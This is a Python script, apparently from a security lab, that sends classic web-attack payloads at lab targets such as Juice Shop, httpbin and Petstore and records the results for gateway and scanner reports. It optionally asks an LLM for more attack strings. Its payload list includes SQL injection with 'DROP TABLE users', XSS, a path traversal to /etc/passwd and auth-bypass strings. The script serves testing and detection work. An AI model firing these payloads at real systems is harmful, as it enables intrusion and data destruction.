"""Attack campaign runner (classic payload replay + optional LLM expansion)."""

from __future__ import annotations

import json
import os
import random
import time
import uuid
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path
from urllib.parse import urlencode

import requests


def now_iso() -> str:
    return datetime.now(UTC).isoformat()


@dataclass(slots=True)
class AttackTarget:
    name: str
    base_url: str
    paths: list[str]


class JsonlWriter:
    def __init__(self, path: str) -> None:
        self.path = Path(path)
        self.path.parent.mkdir(parents=True, exist_ok=True)

    def write(self, row: dict) -> None:
        with open(self.path, "a", encoding="utf-8") as file:
            file.write(json.dumps(row, ensure_ascii=True) + "\n")


def load_llm_payloads() -> list[str]:
    api_key = os.getenv("OPENAI_API_KEY", "").strip()
    if not api_key:
        return []

    base_url = os.getenv("OPENAI_BASE_URL", "https://api.openai.com").rstrip("/")
    model = os.getenv("OPENAI_MODEL", "gpt-4o-mini")
    endpoint = f"{base_url}/v1/chat/completions"
    prompt = (
        "Return a JSON array with 8 short API-attack payload strings for "
        "SQLi, XSS, path traversal and auth abuse. No explanation."
    )
    body = {
        "model": model,
        "temperature": 0.2,
        "messages": [
            {"role": "system", "content": "You output JSON only."},
            {"role": "user", "content": prompt},
        ],
    }

    try:
        response = requests.post(
            endpoint,
            headers={
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json",
            },
            json=body,
            timeout=20,
        )
        response.raise_for_status()
        content = response.json()["choices"][0]["message"]["content"]
        parsed = json.loads(content)
        if isinstance(parsed, list):
            return [str(item)[:200] for item in parsed if str(item).strip()]
    except Exception:
        return []
    return []


def classify_payload(payload: str) -> tuple[str, str]:
    text = payload.lower()
    if "script" in text:
        return "xss", "high"
    if "../" in text:
        return "path_traversal", "high"
    if "' or " in text or "union select" in text or "sleep(" in text:
        return "sqli", "critical"
    if "admin" in text or "token" in text or "authorization" in text:
        return "auth_bypass", "high"
    return "fuzzing", "medium"


def send_attack_request(
    *,
    session: requests.Session,
    target: AttackTarget,
    method: str,
    path: str,
    payload: str,
    request_writer: JsonlWriter,
    strix_proxy_writer: JsonlWriter,
) -> dict:
    url = f"{target.base_url}{path}"
    params = {"q": payload}
    body = {"payload": payload}
    query = urlencode(params)

    started = time.time()
    status_code = 0
    response_size = 0
    response_text = ""
    try:
        if method.upper() == "GET":
            response = session.get(url, params=params, timeout=10)
        else:
            response = session.post(url, json=body, timeout=10)
        status_code = int(response.status_code)
        response_size = len(response.text or "")
        response_text = (response.text or "")[:500]
    except Exception as exc:
        response_text = str(exc)

    elapsed_ms = int((time.time() - started) * 1000)
    category, severity = classify_payload(payload)

    gateway_row = {
        "timestamp": now_iso(),
        "source": "lab_ai_redteam",
        "target_app": target.name,
        "method": method.upper(),
        "path": path,
        "query_string": query,
        "body": json.dumps(body, ensure_ascii=True) if method.upper() != "GET" else "",
        "status_code": status_code,
        "latency_ms": elapsed_ms,
        "scenario_type": "agent_attack",
        "category": category,
        "severity": severity,
    }
    request_writer.write(gateway_row)

    strix_proxy_writer.write(
        {
            "timestamp": now_iso(),
            "method": method.upper(),
            "url": f"{url}?{query}" if method.upper() == "GET" else url,
            "headers": {"Content-Type": "application/json"},
            "body": payload if method.upper() == "GET" else json.dumps(body, ensure_ascii=True),
            "response_status": status_code,
            "response_size": response_size,
            "response_time_ms": elapsed_ms,
        }
    )

    return {
        "id": f"finding-{uuid.uuid4().hex[:8]}",
        "title": f"{category} candidate on {target.name}",
        "type": category,
        "severity": severity,
        "url": url,
        "method": method.upper(),
        "payload": payload,
        "tags": ["agent_attack", "lab_simulated"],
        "response_status": status_code,
        "response_excerpt": response_text,
    }


def persist_strix_bundle(run_dir: Path, findings: list[dict]) -> None:
    (run_dir / "proxy").mkdir(parents=True, exist_ok=True)
    (run_dir / "findings").mkdir(parents=True, exist_ok=True)
    (run_dir / "logs").mkdir(parents=True, exist_ok=True)
    (run_dir / "evidence").mkdir(parents=True, exist_ok=True)

    with open(run_dir / "report.json", "w", encoding="utf-8") as file:
        json.dump({"generated_at": now_iso(), "findings": len(findings)}, file, indent=2)
    with open(run_dir / "report.md", "w", encoding="utf-8") as file:
        file.write(f"# AI Redteam Report\n\nFindings: {len(findings)}\n")
    with open(run_dir / "logs" / "run.log", "w", encoding="utf-8") as file:
        file.write(f"{now_iso()} generated findings={len(findings)}\n")

    for idx, finding in enumerate(findings, start=1):
        with open(run_dir / "findings" / f"finding-{idx:03d}.json", "w", encoding="utf-8") as file:
            json.dump(finding, file, indent=2)


def persist_shannon_bundle(session_dir: Path, findings: list[dict]) -> None:
    deliverables = session_dir / "deliverables"
    agents = session_dir / "agents"
    deliverables.mkdir(parents=True, exist_ok=True)
    agents.mkdir(parents=True, exist_ok=True)

    queue_rows = []
    evidence_rows = []
    for finding in findings:
        queue_rows.append(
            {
                "id": finding["id"],
                "title": finding["title"],
                "type": finding["type"],
                "severity": finding["severity"],
                "endpoint": f'{finding["method"]} {finding["url"]}',
                "payload": finding["payload"],
            }
        )
        evidence_rows.append(
            {
                "title": finding["title"],
                "severity": finding["severity"],
                "request": {
                    "method": finding["method"],
                    "url": finding["url"],
                    "body": finding["payload"],
                },
                "response": {
                    "status_code": finding.get("response_status", 0),
                    "body": finding.get("response_excerpt", ""),
                },
            }
        )

    with open(deliverables / "INJECTION_QUEUE.json", "w", encoding="utf-8") as file:
        json.dump(queue_rows, file, indent=2)
    with open(deliverables / "INJECTION_EVIDENCE.json", "w", encoding="utf-8") as file:
        json.dump(evidence_rows, file, indent=2)
    with open(agents / "injection-exploit.log", "w", encoding="utf-8") as file:
        for row in evidence_rows:
            req = row["request"]
            file.write(
                f'curl -X {req["method"]} "{req["url"]}" -d \'{req["body"]}\'\n'
            )
    with open(session_dir / "session.json", "w", encoding="utf-8") as file:
        json.dump({"targetUrl": "multi-target-lab", "generated_at": now_iso()}, file, indent=2)


def snapshot_control_metrics(control_url: str, token: str, output_path: Path) -> None:
    if not token.strip():
        return
    output_path.parent.mkdir(parents=True, exist_ok=True)
    endpoint = f"{control_url.rstrip('/')}/api/v1/metrics/overview"
    try:
        response = requests.get(
            endpoint,
            headers={"Authorization": f"Bearer {token}"},
            timeout=10,
        )
        payload = {
            "timestamp": now_iso(),
            "status_code": response.status_code,
            "body": response.json() if response.headers.get("content-type", "").startswith("application/json") else {},
        }
    except Exception as exc:
        payload = {"timestamp": now_iso(), "error": str(exc)}
    with open(output_path, "w", encoding="utf-8") as file:
        json.dump(payload, file, indent=2)


def main() -> None:
    random.seed(7)

    attack_iterations = max(1, int(os.getenv("ATTACK_ITERATIONS", "4")))
    request_log_path = os.getenv("REQUEST_LOG_PATH", "/lab-artifacts/gateway/attack_requests.jsonl")
    strix_output_dir = Path(os.getenv("STRIX_OUTPUT_DIR", "/lab-artifacts/strix/run_ai_redteam"))
    shannon_output_dir = Path(os.getenv("SHANNON_OUTPUT_DIR", "/lab-artifacts/shannon/session_ai_redteam"))

    targets = [
        AttackTarget("juice_shop", os.getenv("GW_JUICE_URL", "http://gateway-juice:8080").rstrip("/"), ["/rest/products/search"]),
        AttackTarget("httpbin", os.getenv("GW_HTTPBIN_URL", "http://gateway-httpbin:8080").rstrip("/"), ["/anything"]),
        AttackTarget("petstore", os.getenv("GW_PETSTORE_URL", "http://gateway-petstore:8080").rstrip("/"), ["/api/v3/pet"]),
    ]

    payloads = [
        "' OR 1=1--",
        "'; DROP TABLE users; --",
        "<script>alert(1)</script>",
        "../../etc/passwd",
        "admin'--",
        "1 OR SLEEP(3)",
        "{\"$ne\": null}",
    ]
    payloads.extend(load_llm_payloads())
    payloads = list(dict.fromkeys(payloads))

    request_writer = JsonlWriter(request_log_path)
    strix_proxy_writer = JsonlWriter(str(strix_output_dir / "proxy" / "requests.jsonl"))

    findings: list[dict] = []
    session = requests.Session()

    print(
        f"[ai_redteam] start iterations={attack_iterations} payloads={len(payloads)} "
        f"output={request_log_path}"
    )

    for _ in range(attack_iterations):
        for target in targets:
            for payload in payloads:
                path = random.choice(target.paths)
                method = "GET" if random.random() < 0.7 else "POST"
                finding = send_attack_request(
                    session=session,
                    target=target,
                    method=method,
                    path=path,
                    payload=payload,
                    request_writer=request_writer,
                    strix_proxy_writer=strix_proxy_writer,
                )
                if finding.get("response_status", 0) >= 400:
                    findings.append(finding)
                time.sleep(random.uniform(0.05, 0.20))

    persist_strix_bundle(strix_output_dir, findings)
    persist_shannon_bundle(shannon_output_dir, findings)

    snapshot_control_metrics(
        control_url=os.getenv("DORSAL_CONTROL_URL", "http://host.docker.internal:8000"),
        token=os.getenv("DORSAL_TEST_ORG_TOKEN", ""),
        output_path=Path("/lab-artifacts/reports/control_metrics_after_ai_attack.json"),
    )
    print(f"[ai_redteam] done findings={len(findings)}")


if __name__ == "__main__":
    main()
